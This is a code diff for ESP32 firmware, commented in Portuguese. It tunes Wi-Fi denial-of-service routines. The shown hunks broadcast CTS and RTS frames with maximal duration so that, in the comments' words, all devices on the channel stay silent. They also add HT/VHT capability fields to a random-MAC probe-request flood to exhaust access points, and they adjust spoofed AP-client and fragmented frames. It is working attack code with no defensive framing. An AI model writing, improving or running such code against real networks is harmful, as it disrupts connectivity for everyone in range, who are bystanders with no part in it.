@@ -328,11 +328,11 @@ private:
 
         // AP → Client
         memcpy(f+4, cli, 6); memcpy(f+10, ap, 6); memcpy(f+16, ap, 6);
-        esp_wifi_80211_tx(WIFI_IF_AP, f, 26, true);
+        esp_wifi_80211_tx(WIFI_IF_AP, f, 26, false); // false = usa nossos seq numbers
 
         // Client → AP (spoof reverso)
         memcpy(f+4, ap, 6); memcpy(f+10, cli, 6); memcpy(f+16, ap, 6);
-        esp_wifi_80211_tx(WIFI_IF_AP, f, 26, true);
+        esp_wifi_80211_tx(WIFI_IF_AP, f, 26, false);
     }
 
     // Null data frame com Power Management bit = 1
@@ -499,47 +499,71 @@ private:
         esp_wifi_80211_tx(WIFI_IF_AP, f, 24, false);
     }
 
-    // CTS-to-Self: frame de controle com Duration=32767µs
-    // Mais furtivo — CTS é um frame de controle esperado pelo protocolo
-    // Não precisa de BSSID no frame (frame de controle não tem campo BSSID)
+    // CTS-to-Self broadcast: Duration=32767µs, RA=broadcast
+    // RA broadcast faz TODOS os dispositivos no canal reservarem NAV (não só o AP)
+    // Alterna também RTS (Request-to-Send) para máximo efeito de bloqueio
     void _sendCTSFlood(const uint8_t* ap, uint8_t ch) {
         (void)ch;
+        const uint8_t bcast[6] = {0xFF,0xFF,0xFF,0xFF,0xFF,0xFF};
+
         // CTS frame: FC(2) + Duration(2) + RA(6) = 10 bytes
         uint8_t f[10] = {};
-        f[0] = 0xC4; f[1] = 0x00;  // CTS (0xC4 = subtype 12, type Control)
-        f[2] = 0xFF; f[3] = 0x7F;  // Duration = 32767µs
-        memcpy(f+4, ap, 6);         // RA = AP alvo (fica em silêncio esperando transmitir)
+        f[0] = 0xC4; f[1] = 0x00;   // CTS
+        f[2] = 0xFF; f[3] = 0x7F;   // Duration = 32767µs
+        memcpy(f+4, bcast, 6);        // RA = broadcast → todos reservam NAV
         esp_wifi_80211_tx(WIFI_IF_AP, f, 10, false);
+
+        // RTS frame: FC(2) + Duration(2) + RA(6) + TA(6) = 16 bytes
+        uint8_t r[16] = {};
+        r[0] = 0xB4; r[1] = 0x00;   // RTS
+        r[2] = 0xFF; r[3] = 0x7F;   // Duration = 32767µs
+        memcpy(r+4, ap,    6);        // RA = AP alvo
+        memcpy(r+10, bcast, 6);       // TA = broadcast
+        esp_wifi_80211_tx(WIFI_IF_AP, r, 16, false);
     }
 
-    // Probe Request flood com MAC aleatório e SSID alvo (ou wildcard)
-    // AP precisa gerar Probe Response para cada → CPU/memória do AP esgotam
+    // Probe Request flood com MAC aleatório e HT/VHT Capabilities
+    // APs 802.11n/ac precisam processar os IEs e gerar Probe Response completa → mais CPU
     void _sendProbeFlood(const char* ssid, uint8_t ch) {
         uint8_t srcMac[6], bcast[6] = {0xFF,0xFF,0xFF,0xFF,0xFF,0xFF};
         esp_fill_random(srcMac, 6);
-        srcMac[0] |= 0x02; srcMac[0] &= 0xFE; // locally administered, unicast
+        srcMac[0] |= 0x02; srcMac[0] &= 0xFE;
 
         uint8_t ssidLen = ssid ? (uint8_t)strlen(ssid) : 0;
         if (ssidLen > 32) ssidLen = 32;
 
-        uint8_t f[64] = {};
+        uint8_t f[128] = {};
         uint8_t off = 0;
         f[off++] = 0x40; f[off++] = 0x00; // Probe Request
-        f[off++] = 0x00; f[off++] = 0x00; // Duration = 0
-        memcpy(f+off, bcast,  6); off += 6; // DA = broadcast
-        memcpy(f+off, srcMac, 6); off += 6; // SA = MAC aleatório
-        memcpy(f+off, bcast,  6); off += 6; // BSSID = broadcast
+        f[off++] = 0x00; f[off++] = 0x00;
+        memcpy(f+off, bcast,  6); off += 6;
+        memcpy(f+off, srcMac, 6); off += 6;
+        memcpy(f+off, bcast,  6); off += 6;
         uint16_t sq = _nextSeq();
         f[off++] = sq & 0xFF; f[off++] = (sq >> 8) & 0xFF;
         // SSID IE
         f[off++] = 0x00; f[off++] = ssidLen;
         if (ssid && ssidLen > 0) { memcpy(f+off, ssid, ssidLen); off += ssidLen; }
-        // Supported Rates IE
+        // Supported Rates
         f[off++] = 0x01; f[off++] = 0x08;
         const uint8_t rates[] = {0x82,0x84,0x8B,0x96,0x24,0x30,0x48,0x6C};
         memcpy(f+off, rates, 8); off += 8;
-        // DS Parameter Set IE
+        // DS Parameter Set
         f[off++] = 0x03; f[off++] = 0x01; f[off++] = ch;
+        // Extended Supported Rates
+        f[off++] = 0x32; f[off++] = 0x04;
+        const uint8_t extRates[] = {0x30,0x48,0x60,0x6C};
+        memcpy(f+off, extRates, 4); off += 4;
+        // HT Capabilities IE (tag 45) — força AP a responder com HT info
+        f[off++] = 0x2D; f[off++] = 0x1A;
+        const uint8_t htcap[] = {0xEF,0x19,0x1B,0xFF,0x00,0x00,0x00,0x00,
+                                  0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
+                                  0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00};
+        memcpy(f+off, htcap, 26); off += 26;
+        // VHT Capabilities IE (tag 191) — força resposta 802.11ac
+        f[off++] = 0xBF; f[off++] = 0x0C;
+        const uint8_t vhtcap[] = {0x32,0x00,0x80,0x03,0xAA,0xFF,0x00,0x00,0xAA,0xFF,0x00,0x00};
+        memcpy(f+off, vhtcap, 12); off += 12;
         esp_wifi_80211_tx(WIFI_IF_AP, f, off, false);
     }
 
@@ -561,12 +585,10 @@ private:
         memcpy(f+10, srcMac, 6); // TA = cliente fantasma
         memcpy(f+16, ap,     6); // BSSID = AP
 
-        uint16_t sq = (_nextSeq() & 0xFFF0); // sequence number
-        uint16_t fragCtrl = sq | 0x0000;     // fragment 0
-        fragCtrl |= (1 << 2);                // More Fragments bit no sequence control... na verdade no FC
-        // More Fragments bit fica no Frame Control byte 1, bit 2
+        // MoreFrag fica no FC byte 1 bit 2; Sequence Control = SeqNum(12b) | FragNum(4b)
         f[1] |= 0x04; // More Fragments = 1
-        f[22] = fragCtrl & 0xFF; f[23] = (fragCtrl >> 8) & 0xFF;
+        uint16_t sq = (_nextSeq() & 0xFFF0); // fragment number = 0 (bits 0-3)
+        f[22] = sq & 0xFF; f[23] = (sq >> 8) & 0xFF;
         // Payload aleatório de 4 bytes (simula início de frame encriptado)
         esp_fill_random(f+24, 6);
         esp_wifi_80211_tx(WIFI_IF_AP, f, 30, false);
